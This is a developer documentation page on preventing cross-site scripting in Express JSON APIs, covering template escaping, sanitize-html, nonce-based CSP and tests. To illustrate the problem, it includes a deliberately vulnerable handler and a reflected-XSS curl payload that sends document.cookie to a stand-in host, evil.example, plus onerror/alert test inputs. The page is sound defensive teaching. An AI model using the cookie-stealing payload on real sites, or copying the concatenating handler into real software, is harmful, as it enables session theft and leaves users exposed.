---
title: Cross-site scripting (XSS)
description: Why a JSON API's main XSS risk is stored payloads and server-rendered HTML, with a working exploit, template auto-escaping, sanitize-html, and a CSP with nonces.
status: current
updated: 2026-09-08
---

Cross-site scripting is the execution of attacker-controlled script in a victim's browser in the context of your origin. For a JSON API the risk is narrower than for a classic server-rendered site but real: it lives in **stored** payloads that a client later renders into the DOM, and in any place your server builds HTML by string concatenation. `res.json()` is safe; `res.send('<html>' + userInput + '</html>')` is not.

## The threat

Script running in your origin can read the DOM, read anything the victim can see, make requests as the victim (cookies attached), and exfiltrate session data or CSRF tokens. There are three delivery routes:

- **Reflected** — input in a request is echoed straight back in the response and runs immediately (a search term rendered into an error page).
- **Stored** — input is saved (a comment, a profile bio, a filename) and runs every time someone views it. This is the dangerous one for APIs, because the payload persists and hits many victims.
- **DOM-based** — the server is never involved; client JavaScript writes untrusted data into `innerHTML` or `document.write`. An API can still feed it, so how the client renders your JSON matters.

## Why res.json() is safe and res.send(html) is not

`res.json()` serializes to `application/json` and escapes the characters that matter in JSON. A browser receiving `application/json` does not parse it as HTML, so a stored `<script>` in a field comes back as inert text. The danger appears the moment you build HTML yourself:

:::danger Reflected XSS via res.send with concatenation
Concatenating user input into an HTML string and sending it as `text/html` executes any markup the user supplied.
:::

```js vulnerable title="DO NOT COPY"
import express from 'express'

const app = express()

app.get('/search', (req, res) => {
  const q = req.query.q
  // Concatenated into HTML and sent as text/html — the input becomes markup.
  res.send(`<h1>Results for ${q}</h1>`)
})

app.listen(3000)
```

### The exploit

```bash
curl -s 'http://localhost:3000/search?q=<script>fetch("https://evil.example/?c="%2Bdocument.cookie)</script>'
```

Response — the script is part of the HTML and runs in the victim's browser:

```html
<h1>Results for <script>fetch("https://evil.example/?c="+document.cookie)</script></h1>
```

A link carrying that query string, sent to a logged-in victim, exfiltrates their cookies (unless the cookie is `httpOnly` — see below).

## The fix in code

Return data as JSON and let the client render it through APIs that escape by default (`textContent`, framework interpolation). When you must produce HTML on the server, use a template engine and its **escaping** output, never string concatenation.

```js good title="src/search.controller.js"
// Return data, not markup. The client renders it with textContent/framework
// interpolation, both of which escape.
app.get('/search', (req, res) => {
  const q = String(req.query.q ?? '')
  res.json({ query: q, results: search(q) })
})
```

If a query string field is echoed back as JSON, the stored `<script>` is just a string value; the browser never treats an `application/json` body as executable.

### Template auto-escaping

Server-rendered templates escape by default through one syntax and deliberately do **not** through another. Using the wrong one is the most common template XSS:

| Engine | Escapes (safe) | Does NOT escape (raw HTML) |
| --- | --- | --- |
| EJS | `<%= value %>` | `<%- value %>` |
| Pug | `= value` | `!= value` |
| Handlebars | `{{ value }}` | `{{{ value }}}` |

```html title="views/search.ejs"
<!-- Safe: <%= %> HTML-escapes the value. -->
<h1>Results for <%= query %></h1>

<!-- Dangerous: <%- %> writes the value as raw HTML. Only for pre-sanitized content. -->
<!-- <h1>Results for <%- query %></h1> -->
```

Reserve the raw-output form for content you have already sanitized, and treat every un-escaped interpolation in a review as a potential hole.

### Sanitizing rich text

When users legitimately submit HTML (a rich-text editor), you cannot escape it — that would show the tags. Instead **sanitize** it against an allow-list of tags and attributes. Sanitize on **output/render**, not only on input: your allow-list policy will change over time, and sanitizing at render means old stored content is filtered by today's policy. `sanitize-html` (2.17.7) runs server-side; DOMPurify (3.4.15) runs in the browser or under a DOM shim.

```js good title="src/sanitize.js"
import sanitizeHtml from 'sanitize-html'

const POLICY = {
  allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'ol', 'li', 'br'],
  allowedAttributes: { a: ['href'] },
  allowedSchemes: ['http', 'https', 'mailto'], // blocks javascript: URLs
}

export function renderUserHtml(dirty) {
  return sanitizeHtml(dirty, POLICY) // strips <script>, onerror=, javascript:
}
```

An `<img src=x onerror=alert(1)>` payload loses its `onerror`; a `<a href="javascript:...">` loses its href. The allow-list decides what survives, so it fails closed: anything you did not explicitly permit is removed.

## Defense in depth

Sanitizing is the fix; the headers below limit the damage of any XSS you missed.

### Content-Security-Policy with nonces

A CSP tells the browser which script sources to trust. A strict policy with a per-response **nonce** means an injected inline `<script>` — which lacks the nonce — does not run, even if it reaches the page. Helmet (8.3.0) sets the header; you generate the nonce per request.

```js good title="src/csp.js"
import crypto from 'node:crypto'
import helmet from 'helmet'

export function csp() {
  return [
    (req, res, next) => {
      res.locals.nonce = crypto.randomBytes(16).toString('base64')
      next()
    },
    helmet.contentSecurityPolicy({
      directives: {
        defaultSrc: ["'self'"],
        // Only scripts carrying this exact nonce execute.
        scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
        objectSrc: ["'none'"],
        baseUri: ["'self'"],
      },
    }),
  ]
}
```

```html title="views/layout.ejs"
<!-- Your own scripts carry the nonce; injected inline scripts do not. -->
<script nonce="<%= nonce %>">/* app bootstrap */</script>
```

:::danger 'unsafe-inline' defeats the point
Adding `'unsafe-inline'` to `scriptSrc` tells the browser to run *any* inline script, including the attacker's. It makes the nonce meaningless. If a third-party widget "needs" it, give that widget its own nonce or hash instead of opening inline execution globally.
:::

### The supporting headers and cookie flag

- **`X-Content-Type-Options: nosniff`** stops the browser from guessing a response is HTML when you sent JSON. Without it, a JSON response containing markup can be sniffed and rendered as HTML in some contexts. Helmet sets it by default.
- **Serve JSON with the right content type.** `res.json()` sets `application/json`; do not override it to `text/html`. The content type is what keeps a stored payload inert.
- **`httpOnly` cookies** cannot be read by `document.cookie`, so even successful XSS cannot steal the session cookie directly. It does not stop the script from *acting* as the victim, but it removes the simplest exfiltration path.

## How to verify the fix

Re-run the reflected payload against the JSON handler. It comes back as an escaped string in a JSON body, not as executable markup:

```bash
curl -s -i 'http://localhost:3000/search?q=<script>alert(1)</script>'
```

```text
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff

{"query":"<script>alert(1)</script>","results":[]}
```

The `Content-Type: application/json` line is the guarantee: the browser will not execute the string. For sanitized rich text, assert that dangerous constructs are stripped:

```js title="test/xss.test.js"
import test from 'node:test'
import assert from 'node:assert/strict'
import request from 'supertest'
import { createApp } from '../src/app.js'
import { renderUserHtml } from '../src/sanitize.js'

test('search echoes input as an inert JSON string', async () => {
  const res = await request(createApp()).get('/search').query({ q: '<script>alert(1)</script>' })
  assert.match(res.headers['content-type'], /application\/json/)
  assert.equal(res.body.query, '<script>alert(1)</script>') // data, not markup
})

test('sanitizer strips script and event handlers', () => {
  const clean = renderUserHtml('<img src=x onerror=alert(1)><b>ok</b><script>alert(1)</script>')
  assert.ok(!clean.includes('onerror'))
  assert.ok(!clean.includes('<script'))
  assert.ok(clean.includes('<b>ok</b>'))
})
```

## Common mistakes

- **Building HTML with `res.send('<...>' + input)`.** Concatenation makes input into markup. Return JSON, or render through an escaping template.
- **Using the raw-output template form** (`<%- %>`, `!=`, `{{{ }}}`) for user data. That is exactly the un-escaped path. Use `<%= %>` / `=` / `{{ }}`.
- **Sanitizing only on input.** Your policy evolves; render-time sanitizing applies today's policy to old data. Sanitize on output.
- **"Escaping" rich text.** You cannot escape HTML the user is meant to see. Allow-list tags with `sanitize-html`/DOMPurify.
- **`'unsafe-inline'` in the CSP.** It re-enables inline script execution and voids the nonce. Use nonces or hashes for the scripts you actually need.
- **Overriding the JSON content type to `text/html`.** That hands the browser permission to render stored payloads. Leave `res.json()`'s content type alone and send `nosniff`.
- **Assuming `httpOnly` prevents XSS.** It only blocks cookie theft via `document.cookie`; the script can still act as the victim. It is mitigation, not a fix.

## Production considerations

- Roll out CSP in `Content-Security-Policy-Report-Only` first with a `report-to` endpoint, watch for violations from legitimate scripts, then switch to enforcing. A too-strict CSP shipped blind breaks your own app.
- Keep the sanitizer policy in one module and version it; when you tighten it, previously stored content is re-filtered at render because you sanitize on output.
- Prefer frameworks and template output that escape by default so safety is the path of least resistance, and flag every raw-HTML interpolation in code review.

## Related topics

- [File upload security](file-upload-security.md) — uploaded SVG/HTML served inline is stored XSS.
- [CSRF](csrf.md) — the other cross-site attack; XSS defeats CSRF tokens, so fixing XSS matters for both.
- [Security headers](security-headers.md) — CSP, `nosniff` and the rest of the Helmet defaults.
- [Cookies](../express-libraries/cookies.md) — `httpOnly`, `secure` and `sameSite` flags.
- [Validation](../express-libraries/validation.md) — constraining input shape before it is stored or rendered.
